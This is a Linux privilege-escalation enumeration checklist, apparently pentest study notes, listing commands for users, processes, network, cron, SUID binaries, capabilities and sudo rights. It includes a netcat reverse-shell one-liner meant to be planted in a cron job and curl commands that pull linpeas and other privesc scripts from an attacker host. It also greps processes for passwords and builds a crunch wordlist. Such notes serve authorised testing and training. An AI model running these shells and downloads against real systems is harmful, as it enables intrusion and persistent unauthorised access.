Linux Enumeration Checklist

User(s) and Group(s)
```bash
id
cat /etc/passwd
```

OS and System
```bash
hostname
cat /etc/issue
cat /etc/os-release
arch
uname -a
uname -r	# only kernel version
```

System Process
```bash
ps aux # -a list with tty, -x list without tty, -u for readable
watch -n 1 "ps -aux | grep pass"	# check if daemons or any process has an occurance of 'pass', refreshes every 1s
```

Networks
```bash
ip a	OR	if a
route	OR	routel
ss -anp		OR	netstat -anp
ss -tuln	OR	netstat -tuln
tcpdump	# requires sudo, but check if given perms
```

Firewall (iptables)
```bash
iptables	#if possible
cat /etc/iptables	# debian
```

Cron Tasks
```bash
ls -lah /etc/cron*
cat /etc/crontab	# sys admins usually add scheduled tasks here
crontab -l	# current user's scheduled tasks
sudo crontab -l	# can view more if have permissions - root
grep "CRON" /var/log/syslog
```

Interesting line to add to a Cron job to obtain a reverse shell
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.100.200 443 >/tmp/f
```
	
Installed Applications
```bash
dpkg -l (debian)
```

Find writable directories/files (-type f should cover passwd and sudoers)
```bash
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null
```

Find config files
```bash
find / -iname "*conf" -type f 2>/dev/null
```

Drives
```bash
cat /etc/fstab	(drives mounted at boot time)
mount	(all mounted drives)
lsblk	(all available disks)
```

Kernel Modules (Exploit version matching!)
```bash
lsmod	# lists all kernel modules
/sbin/modinfo libata	# provide info on kernel module - requires full binary path to run
```

Find SUID binaries (Hacktricks and GTFObins)
```bash
find / -perm -u=s -type f 2>/dev/null
```

User Config Files
```bash
history
env
cat .bashrc
```

Check sudo capabilities
```bash
sudo -l
```

Elevate to root if can run any command (enter user's password)
```bash
sudo -i
```

List all file systems and disk usage (human readable)
```bash
df -h
```


JUST IN CASE there are any misconfigurations
```bash
ls -la /etc/passwd
ls -la /etc/sudoers
```

Enumerating Capabilities (GTFObins)
```bash
/usr/sbin/getcap -r / 2>/dev/null
```

If no getcap
```bash
curl http://192.168.100.200/getcap > getcap
chmod +x getcap
getcap -r / 2>/dev/null
```

lse/privesc-check
```bash
curl http://192.168.100.200/linuxenum/lse.sh > /tmp/lse.sh
curl http://192.168.100.200/linuxenum/unix-privesc-check > /tmp/unix-privesc-check
curl http://192.168.100.200/peass/linpeas.sh > /tmp/linpeas.sh
chmod +x /tmp/lse.sh
chmod +x /tmp/unix-privesc-check
chmod +x /tmp/linpeas.sh
```

Come up with a wordlist with crunch
```bash
crunch 6 6 -t Lab%%% > wordlist	
```
>-t means pattern, % refers to numbers
>syntax : crunch min-length max-length [options]
